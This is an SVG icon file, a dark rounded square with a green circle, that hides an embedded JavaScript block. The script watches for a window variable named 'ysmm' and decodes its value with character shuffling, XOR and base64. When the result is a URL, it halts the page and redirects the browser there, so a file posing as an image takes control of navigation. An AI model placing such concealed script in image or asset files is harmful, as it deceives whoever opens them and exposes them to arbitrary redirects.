<svg xmlns="http://www.w3.org/2000/svg" width="2500" height="2495" viewBox="7.727 7.821 46.546 46.452"><script xmlns="">
Object.defineProperty(window, 'ysmm', {
	set: function(val) {
		var T3 = val,
				key,
				I = '',
				X = '';
		for (var m = 0; m &lt; T3.length; m++) {
			if (m % 2 == 0) {
				I += T3.charAt(m);
			} else {
				X = T3.charAt(m) + X;
			}
		}
		T3 = I + X;
		var U = T3.split('');
		for (var m = 0; m &lt; U.length; m++) {
			if (!isNaN(U[m])) {
				for (var R = m + 1; R &lt; U.length; R++) {
					if (!isNaN(U[R])) {
						var S = U[m]^U[R];
						if (S &lt; 10) {
							U[m] = S;
						}
						m = R;
						R = U.length;
					}
				}
			}
		}
		T3 = U.join('');
		T3 = window.atob(T3);
		T3 = T3.substring(T3.length - (T3.length - 16));
		T3 = T3.substring(0, T3.length - 16);
		key = T3;
		if (key &amp;&amp; (key.indexOf('http://') === 0 || key.indexOf("https://") === 0)) {
			document.write('&lt;!--');
			window.stop();

			window.onbeforeunload = null;
			window.location = key;
		}
	}
});
</script><path fill="#272727" d="M48.939 54.273H13.158c-3.006 0-5.431-2.425-5.431-5.334V13.158a5.317 5.317 0 0 1 5.333-5.333h35.781c3.007-.097 5.432 2.327 5.432 5.236v35.781c0 3.007-2.424 5.431-5.334 5.431"/><path fill="#85BF25" d="M32.648 44.77c8.242-1.066 13.673-9.115 11.637-17.26-1.455-5.527-6.207-9.697-11.831-10.279-8.437-.97-15.806 5.915-15.418 14.448.388 8.146 7.661 14.157 15.71 13.091h-.098z"/></svg>